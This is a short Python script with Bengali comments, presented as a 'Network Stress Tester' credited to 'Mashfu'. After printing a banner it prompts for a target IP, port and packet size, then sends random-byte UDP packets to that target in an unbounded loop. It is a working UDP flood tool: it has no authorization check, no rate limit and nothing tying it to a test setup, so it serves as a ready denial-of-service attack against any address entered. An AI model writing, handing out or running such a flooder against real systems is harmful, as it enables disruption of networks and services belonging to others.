import socket
import random
import os

# ব্যানার প্রিন্ট করার ফাংশন
def banner():
    print("\033[1;32m") # সবুজ রঙ শুরু
    print("""
  __  __           _      __      
 |  \/  |         | |    / _|     
 | \  / | __ _ ___| |__ | |_ _   _ 
 | |\/| |/ _` / __| '_ \|  _| | | |
 | |  | | (_| \__ \ | | | | | |_| |
 |_|  |_|\__,_|___/_| |_|_|  \__,_|
                                   
      Network Stress Tester v1.0
    """)
    print("\033[0m") # রঙ রিসেট
    print("\033[1;34m------------------------------------\033[0m")
    print("\033[1;33mCreated by: Mashfu\033[0m")
    print("\033[1;34m------------------------------------\033[0m\n")

# ব্যানারটি কল করা
banner()

# স্ক্রিন ক্লিয়ার করা
os.system("clear")

print("==============================")
print("   Network Stress Tester      ")
print("==============================")

target_ip = input("Target IP: ")
target_port = int(input("Target Port: "))
packet_size = int(input("Packet Size (e.g. 1024): "))

# সকেট তৈরি করা
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes_to_send = random._urandom(packet_size)

print(f"\nSending packets to {target_ip} on port {target_port}...")

sent = 0
try:
    while True:
        sock.sendto(bytes_to_send, (target_ip, target_port))
        sent += 1
        print(f"Sent {sent} packets to {target_ip}", end="\r")
except KeyboardInterrupt:
    print("\n\nStopped by user.")


